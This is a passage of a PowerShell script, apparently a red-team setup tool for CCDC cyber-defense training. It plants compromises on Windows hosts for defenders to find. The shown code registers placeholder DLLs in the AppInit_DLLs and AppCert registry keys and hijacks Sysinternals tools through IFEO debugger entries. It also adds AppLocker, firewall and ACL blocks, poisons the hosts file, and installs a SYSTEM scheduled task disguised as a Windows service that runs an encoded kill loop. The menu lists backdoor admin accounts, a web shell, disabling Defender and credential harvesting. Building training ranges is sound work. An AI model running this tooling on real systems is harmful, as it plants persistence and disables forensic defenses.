            Set-Content -Path $dllPath -Value "CCDC_TRAINING_DLL_MARKER - $dll"
            (Get-Item $dllPath).Attributes = 'Hidden'
        }
    }
    Write-Status "Marker DLL files created in $injectionDir" 'Success'

    # Step 2: AppInit_DLLs
    Write-Status "Step 2: Registering AppInit_DLLs (global injection point)..."
    $appInitPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
    try {
        $backupPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ccdc_backup"
        if (-not (Test-Path $backupPath)) {
            New-Item -Path $backupPath -Force | Out-Null
            $appInitValue     = (Get-ItemProperty $appInitPath -ErrorAction SilentlyContinue)."AppInit_DLLs"
            $loadAppInitValue = (Get-ItemProperty $appInitPath -ErrorAction SilentlyContinue).LoadAppInit_DLLs
            Set-ItemProperty $backupPath -Name "AppInit_DLLs"     -Value $appInitValue     -ErrorAction SilentlyContinue
            Set-ItemProperty $backupPath -Name "LoadAppInit_DLLs" -Value $loadAppInitValue -ErrorAction SilentlyContinue
        }
        $injectionDll = "$injectionDir\ccdc_hook.dll"
        Set-ItemProperty $appInitPath -Name "AppInit_DLLs"     -Value $injectionDll
        Set-ItemProperty $appInitPath -Name "LoadAppInit_DLLs" -Value 1
        Write-Status "AppInit_DLLs registered: $injectionDll" 'Success'
    } catch { Write-Status "AppInit_DLLs setup error: $_" 'Warning' }

    # Step 3: AppCert DLLs
    Write-Status "Step 3: Registering AppCert DLLs (process creation intercept)..."
    $appCertPath = "HKLM:\System\CurrentControlSet\Control\Session Manager\AppCertDLLs"
    try {
        if (-not (Test-Path $appCertPath)) { New-Item -Path $appCertPath -Force | Out-Null }
        Set-ItemProperty $appCertPath -Name "CCDC_ProcessHook" -Value "$injectionDir\ccdc_inject.dll"
        Write-Status "AppCert DLL registered for process creation" 'Success'
    } catch { Write-Status "AppCert DLLs setup error: $_" 'Warning' }

    # Step 4: Trojanized version.dll
    Write-Status "Step 4: Setting up DLL search order hijacking..."
    try {
        $trojanDll = "$injectionDir\version.dll"
        if (-not (Test-Path $trojanDll)) {
            Set-Content -Path $trojanDll -Value "; Trojanized version.dll marker`nCCDC_TROJANIZED_DLL"
            (Get-Item $trojanDll).Attributes = 'Hidden'
        }
        Write-Status "DLL search order hijacking prepared" 'Success'
    } catch { Write-Status "DLL search order setup error: $_" 'Warning' }

    # Step 5: Hook log
    Write-Status "Step 5: Creating hook information log..."
    $hookLog = @"
================================================================================
                        CCDC DLL HOOK ACTIVITY LOG
================================================================================
Timestamp: $(Get-Date)
System: $env:COMPUTERNAME
User: $env:USERNAME

REGISTRY INJECTION POINTS:
  AppInit_DLLs     : $injectionDir\ccdc_hook.dll
  AppCert DLLs     : $injectionDir\ccdc_inject.dll
  Backup key       : HKLM\...\ccdc_backup

HIDDEN FILES:
  $injectionDir\*.dll
  C:\Windows\Temp\ccdc_hook_log.txt

DETECTION: dir /a:h C:\Windows\Temp\ccdc_*
CLEANUP:   .\CCDC_Windows_DLL_HookLineAndSinker.ps1 -Cleanup
================================================================================
"@
    Set-Content -Path "C:\Windows\Temp\ccdc_hook_log.txt" -Value $hookLog
    (Get-Item "C:\Windows\Temp\ccdc_hook_log.txt").Attributes = 'Hidden'
    Write-Status "Hook log created (hidden)" 'Success'

    Write-Success "DLL Hook complete."
    Write-Info "  AppInit_DLLs, AppCert DLLs, and trojanized version.dll planted."
    Write-Warn "  To cleanup: .\CCDC_Windows_DLL_HookLineAndSinker.ps1 -Cleanup"
}

# =============================================================================
# 9. SYSINTERNALS NUKER  - 7-layer block on Sysinternals tools
# (from CCDC_Windows_SysInternals_SysInternalsNuker.ps1)
# =============================================================================
function Invoke-SysInternalsNuker {
    Write-Section "9/9  - SysInternals Nuker: 7-layer block on forensic tools"

    $BlockerStubPath  = "C:\Windows\System32\SysInternalsBlocked.cmd"
    $IFEOBase         = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
    $FirewallRuleName = "CCDC_Block_SysInternals_Outbound"
    $WatchdogTaskName = "WindowsDiagTrackCacheRefresh"
    $WatchdogTaskPath = "\Microsoft\Windows\WindowsUpdate\"

    $TargetTools = @(
        "procexp.exe",    "procexp64.exe",
        "procmon.exe",    "procmon64.exe",
        "tcpview.exe",
        "autoruns.exe",   "autoruns64.exe",  "autorunsc.exe",
        "handle.exe",     "handle64.exe",
        "strings.exe",    "strings64.exe",
        "listdlls.exe",   "listdlls64.exe",
        "accesschk.exe",  "accesschk64.exe",
        "procdump.exe",   "procdump64.exe",
        "pslist.exe",
        "bginfo.exe",
        "sysmon.exe",     "sysmon64.exe"
    )

    $SysInternalsHosts = @("live.sysinternals.com", "download.sysinternals.com")

    # -- Layer 1: IFEO ----------------------------------------------------------
    Write-Info "Layer 1: Setting IFEO intercepts..."
    $stub = @'
@echo off
cls
echo.
echo  BZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZT
echo.
pause
exit /b 1
'@
    try {
        Set-Content -Path $BlockerStubPath -Value $stub -Encoding ASCII -Force
        Write-Success "  Blocker stub written: $BlockerStubPath"
    } catch { Write-Err "  Could not write blocker stub: $_"; return }

    foreach ($tool in $TargetTools) {
        $regPath = "$IFEOBase\$tool"
        try {
            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force -ErrorAction Stop | Out-Null }
            Set-ItemProperty -Path $regPath -Name "Debugger" -Value $BlockerStubPath -ErrorAction Stop
            Write-Success "  IFEO: $tool"
        } catch { Write-Warn "  IFEO failed for $tool : $_" }
    }

    # -- Layer 2: AppLocker -----------------------------------------------------
    Write-Info "Layer 2: Configuring AppLocker deny rules..."
    try {
        Set-Service -Name AppIDSvc -StartupType Automatic -ErrorAction Stop
        Start-Service -Name AppIDSvc -ErrorAction Stop

        $denyRules = foreach ($t in $TargetTools) {
            $guid = [System.Guid]::NewGuid().ToString()
            "    <FilePathRule Id=""$guid"" Name=""CCDC_Block_$t"" Description=""CCDC Sysinternals block"" UserOrGroupSid=""S-1-1-0"" Action=""Deny"">
      <Conditions>
        <FilePathCondition Path=""*\$t"" />
      </Conditions>
    </FilePathRule>"
        }

        $allowWin    = [System.Guid]::NewGuid().ToString()
        $allowPF     = [System.Guid]::NewGuid().ToString()
        $allowPFx86  = [System.Guid]::NewGuid().ToString()
        $allowAdmins = [System.Guid]::NewGuid().ToString()

        $policyXml = @"
<AppLockerPolicy Version="1">
  <RuleCollection Type="Exe" EnforcementMode="Enabled">
    <FilePathRule Id="$allowAdmins" Name="Allow Administrators everything" Description="" UserOrGroupSid="S-1-5-32-544" Action="Allow">
      <Conditions><FilePathCondition Path="*" /></Conditions>
    </FilePathRule>
    <FilePathRule Id="$allowWin" Name="Allow Windows" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">
      <Conditions><FilePathCondition Path="%WINDIR%\*" /></Conditions>
    </FilePathRule>
    <FilePathRule Id="$allowPF" Name="Allow ProgramFiles" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">
      <Conditions><FilePathCondition Path="%PROGRAMFILES%\*" /></Conditions>
    </FilePathRule>
    <FilePathRule Id="$allowPFx86" Name="Allow ProgramFiles x86" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">
      <Conditions><FilePathCondition Path="%PROGRAMFILES(X86)%\*" /></Conditions>
    </FilePathRule>
$($denyRules -join "`n")
  </RuleCollection>
</AppLockerPolicy>
"@
        $policyFile = "$env:TEMP\ccdc_applocker_combustion.xml"
        Set-Content -Path $policyFile -Value $policyXml -Encoding UTF8 -Force
        Set-AppLockerPolicy -XmlPolicy $policyFile -Merge -ErrorAction Stop
        Remove-Item $policyFile -Force -ErrorAction SilentlyContinue
        Write-Success "  AppLocker deny rules merged and AppIDSvc started"
    } catch { Write-Warn "  AppLocker config failed (Layer 2 skipped -- IFEO still active): $_" }

    # -- Layer 3: Hosts file ----------------------------------------------------
    Write-Info "Layer 3: Poisoning hosts file for Sysinternals domains..."
    $hostsPath = "C:\Windows\System32\drivers\etc\hosts"
    try {
        $hostsContent = Get-Content -Path $hostsPath -Raw -ErrorAction Stop
        foreach ($domain in $SysInternalsHosts) {
            if ($hostsContent -notmatch [regex]::Escape($domain)) {
                Add-Content -Path $hostsPath -Value "`r`n127.0.0.1  $domain" -Encoding ASCII -ErrorAction Stop
                Write-Success "  Hosts: $domain -> 127.0.0.1"
            } else {
                Write-Warn "  Hosts: $domain already present, skipping"
            }
        }
    } catch { Write-Warn "  Hosts file update failed: $_" }

    # -- Layer 4: Disable WebClient ---------------------------------------------
    Write-Info "Layer 4: Disabling WebClient service (kills live UNC access)..."
    try {
        Stop-Service -Name WebClient -Force -ErrorAction SilentlyContinue
        Set-Service  -Name WebClient -StartupType Disabled -ErrorAction Stop
        Write-Success "  WebClient service disabled"
    } catch { Write-Warn "  WebClient disable failed: $_" }

    # -- Layer 5: Outbound firewall block ---------------------------------------
    Write-Info "Layer 5: Adding outbound firewall block for Sysinternals domains..."
    try {
        Remove-NetFirewallRule -DisplayName $FirewallRuleName -ErrorAction SilentlyContinue
        $resolvedIPs = @()
        foreach ($domain in $SysInternalsHosts) {
            try {
                $ips = [System.Net.Dns]::GetHostAddresses($domain) | Select-Object -ExpandProperty IPAddressToString
                $resolvedIPs += $ips
            } catch {}
        }
        if ($resolvedIPs.Count -gt 0) {
            New-NetFirewallRule `
                -DisplayName  $FirewallRuleName `
                -Direction    Outbound `
                -Action       Block `
                -Protocol     TCP `
                -RemotePort   80,443 `
                -RemoteAddress ($resolvedIPs | Sort-Object -Unique) `
                -Description  "CCDC: block Sysinternals download endpoints" `
                -ErrorAction Stop | Out-Null
            Write-Success "  Firewall rule created blocking $($resolvedIPs.Count) IP(s)"
        } else {
            Write-Warn "  DNS returned no IPs (hosts already poisoned?) -- skipping firewall rule"
        }
    } catch { Write-Warn "  Firewall rule creation failed: $_" }

    # -- Layer 6: NTFS deny-execute on drop paths -------------------------------
    Write-Info "Layer 6: Denying execute on common tool drop paths..."
    $dropPaths = [System.Collections.Generic.List[string]]@(
        "C:\Tools", "C:\Sysinternals", "C:\SysInternals64", "C:\Windows\Temp"
    )
    if (Test-Path "C:\Users") {
        foreach ($profile in (Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue)) {
            $dropPaths.Add("$($profile.FullName)\Downloads")
            $dropPaths.Add("$($profile.FullName)\Desktop")
            $dropPaths.Add("$($profile.FullName)\AppData\Local\Temp")
        }
    }
    foreach ($path in $dropPaths) {
        if (-not (Test-Path $path)) {
            try { New-Item -ItemType Directory -Path $path -Force | Out-Null } catch { continue }
        }
        try {
            $acl = Get-Acl -Path $path -ErrorAction Stop
            $denyRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
                "BUILTIN\Users",
                [System.Security.AccessControl.FileSystemRights]::ExecuteFile,
                [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit",
                [System.Security.AccessControl.PropagationFlags]::None,
                [System.Security.AccessControl.AccessControlType]::Deny
            )
            $acl.AddAccessRule($denyRule)
            Set-Acl -Path $path -AclObject $acl -ErrorAction Stop
            Write-Success "  ACL deny-execute: $path"
        } catch { Write-Warn "  ACL failed for $path : $_" }
    }

    # -- Layer 7: Watchdog kill task --------------------------------------------
    Write-Info "Layer 7: Installing watchdog kill task..."
    try {
        $processNames = ($TargetTools |
            ForEach-Object { [System.IO.Path]::GetFileNameWithoutExtension($_) } |
            Sort-Object -Unique) -join "','"

        $killerScript = @"
`$targets = @('$processNames')
foreach (`$name in `$targets) {
    `$procs = Get-Process -Name `$name -ErrorAction SilentlyContinue
    if (`$procs) { `$procs | Stop-Process -Force -ErrorAction SilentlyContinue }
}
"@
        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($killerScript))

        Unregister-ScheduledTask -TaskName $WatchdogTaskName -Confirm:$false -ErrorAction SilentlyContinue

        $action    = New-ScheduledTaskAction -Execute "powershell.exe" `
                         -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $encoded"
        $trigger   = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10) `
                         -RepetitionInterval (New-TimeSpan -Seconds 60) `
                         -RepetitionDuration ([System.TimeSpan]::MaxValue)
        $settings  = New-ScheduledTaskSettingsSet `
                         -ExecutionTimeLimit ([System.TimeSpan]::Zero) `
                         -MultipleInstances  IgnoreNew
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest

        Register-ScheduledTask `
            -TaskName    $WatchdogTaskName `
            -TaskPath    $WatchdogTaskPath `
            -Action      $action `
            -Trigger     $trigger `
            -Settings    $settings `
            -Principal   $principal `
            -Description "Windows Diagnostic Cache Refresh Service (system managed)" `
            -ErrorAction Stop | Out-Null

        Write-Success "  Watchdog task registered: $WatchdogTaskPath$WatchdogTaskName"
    } catch { Write-Warn "  Watchdog task failed: $_" }

    Write-Success "All 7 layers deployed. Sysinternals is on fire."
    Write-Warn "  Run .\CCDC_Windows_SysInternals_SysInternalsNuker.ps1 -Undo to restore."
}

# =============================================================================
# MAIN  - Interactive menu loop or -Modules param dispatch
# =============================================================================

# Menu entry definitions
$menuItems = @(
    @{ Key='1'; Name='Users';          Label='Rogue Users       - 3 backdoor Domain Admin AD accounts' }
    @{ Key='2'; Name='WebShell';       Label='Web Shell         - Rogue IIS site on port 777' }
    @{ Key='3'; Name='ScheduledTasks'; Label='Scheduled Tasks   - Notepad alert + service killer every 3 min' }
    @{ Key='4'; Name='Persistence';    Label='Persistence       - 5-location startup persistence planter' }
    @{ Key='5'; Name='DefenderNeuter'; Label='Defender Neuter   - Disable Defender, Firewall, Security Center' }
    @{ Key='6'; Name='RemoteAccess';   Label='Remote Access     - Misconfigure RDP, WinRM, SSH, Telnet, SNMP' }
    @{ Key='7'; Name='LSA';            Label='LSA Loot          - LSA SSP/CredProvider credential harvesting' }
    @{ Key='8'; Name='DLLHook';        Label='DLL Hook          - AppInit_DLLs, AppCert DLLs, search-order hijack' }
    @{ Key='9'; Name='SysInternals';   Label='SysInternals      - 7-layer block on Sysinternals forensic tools' }
)

# Map both numbers and names to a canonical name
$moduleMap = @{
    '1'               = 'Users'
    '2'               = 'WebShell'
    '3'               = 'ScheduledTasks'
    '4'               = 'Persistence'
    '5'               = 'DefenderNeuter'
    '6'               = 'RemoteAccess'
    '7'               = 'LSA'
    '8'               = 'DLLHook'
    '9'               = 'SysInternals'
    'USERS'           = 'Users'
    'WEBSHELL'        = 'WebShell'
    'SCHEDULEDTASKS'  = 'ScheduledTasks'
    'PERSISTENCE'     = 'Persistence'
    'DEFENDERNEUTER'  = 'DefenderNeuter'
    'REMOTEACCESS'    = 'RemoteAccess'
    'LSA'             = 'LSA'
    'DLLHOOK'         = 'DLLHook'
    'SYSINTERNALS'    = 'SysInternals'
}

# Canonical execution order (dependency-safe)
$execOrder = @('Users','WebShell','ScheduledTasks','Persistence',
               'DefenderNeuter','RemoteAccess','LSA','DLLHook','SysInternals')

function Show-Menu {
    param([hashtable]$Status = @{})
    Write-Host ""
    Write-Host "  CCDC Windows Combined Setup" -ForegroundColor Cyan
    Write-Host "  Select modules to run (numbers, comma-separated, or A for all):" -ForegroundColor Yellow
    Write-Host ""
    foreach ($item in $menuItems) {
        if ($Status.ContainsKey($item.Name)) {
            if ($Status[$item.Name] -eq 'ok') {
                Write-Host -NoNewline "    [$($item.Key)] "
                Write-Host -NoNewline "[DONE] " -ForegroundColor Green
                Write-Host $item.Label
            } else {
                Write-Host -NoNewline "    [$($item.Key)] "
                Write-Host -NoNewline "[FAIL] " -ForegroundColor Red
                Write-Host $item.Label
            }
        } else {
            Write-Host "    [$($item.Key)]        $($item.Label)"
        }
    }
    Write-Host "    [A]        All of the above"
    Write-Host "    [Q]        Quit / Done"
    Write-Host ""
}

function Invoke-Modules {
    param([string[]]$ToRun, [hashtable]$Status)
    foreach ($mod in $execOrder) {
        if ($ToRun -contains $mod) {
            try {
                switch ($mod) {
                    'Users'          { Invoke-RogueUsers }
                    'WebShell'       { Invoke-RogueWebShell }
                    'ScheduledTasks' { Invoke-ScheduledTasks }
                    'Persistence'    { Invoke-PersistencePlanter }
                    'DefenderNeuter' { Invoke-DefenderNeuter }
                    'RemoteAccess'   { Invoke-RemoteAccess }
                    'LSA'            { Invoke-LSALootTheVault }
                    'DLLHook'        { Invoke-DLLHookLineAndSinker }
                    'SysInternals'   { Invoke-SysInternalsNuker }
                }
                $Status[$mod] = 'ok'
            } catch {
                Write-Err "Module '$mod' failed: $_"
                $Status[$mod] = 'fail'
            }
        }
    }
}

# -- Non-interactive path (-Modules param supplied) ---------------------------
if ($Modules.Count -gt 0) {
    $toRun = @()
    foreach ($s in $Modules) {
        $key = $s.ToUpper()
        if ($moduleMap.ContainsKey($key)) {
            $canonical = $moduleMap[$key]
            if ($toRun -notcontains $canonical) { $toRun += $canonical }
        } else {
            Write-Warn "Unknown module '$s' -- skipping."
        }
    }
    if ($toRun.Count -eq 0) { Write-Err "No valid modules specified."; exit 1 }
    Write-Info "Running: $($toRun -join ', ')"
    $ran = @{}
    Invoke-Modules -ToRun $toRun -Status $ran
    Write-Section "DONE"
    Write-Success "Selected modules complete."
    Write-Warn "Target setup (CCDC_Windows_TargetSetup_HTTP_FTP_DNS.ps1) is separate -- run it independently if needed."
    exit 0
}

# -- Interactive loop ----------------------------------------------------------
$ran = @{}

while ($true) {
    Show-Menu -Status $ran

    $raw = (Read-Host "  Choice").Trim().ToUpper()

    if ($raw -eq 'Q') {
        Write-Host ""
        if ($ran.Count -gt 0) {
            Write-Section "SESSION SUMMARY"
            foreach ($mod in $execOrder) {
                if ($ran.ContainsKey($mod)) {
                    if ($ran[$mod] -eq 'ok') { Write-Success "  [DONE] $mod" }
                    else                     { Write-Err     "  [FAIL] $mod" }
                }
            }
            Write-Host ""
        }
        Write-Warn "Exiting."
        Write-Warn "Target setup (CCDC_Windows_TargetSetup_HTTP_FTP_DNS.ps1) is separate -- run it independently if needed."
        exit 0
    }

    if ($raw -eq 'A') {
        $selected = @('1','2','3','4','5','6','7','8','9')
    } else {
        $selected = $raw -split '[,\s]+' | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne '' }
    }

    $toRun = @()
    foreach ($s in $selected) {
        $key = $s.ToUpper()
        if ($moduleMap.ContainsKey($key)) {
            $canonical = $moduleMap[$key]
            if ($toRun -notcontains $canonical) { $toRun += $canonical }
        } else {
            Write-Warn "Unknown selection '$s' -- skipping."
        }
    }

    if ($toRun.Count -eq 0) {
        Write-Warn "No valid modules selected -- try again."
        continue
    }

    Write-Host ""
    Write-Info "Running: $($toRun -join ', ')"
    Invoke-Modules -ToRun $toRun -Status $ran

    Write-Host ""
    Write-Success "Batch complete."
}
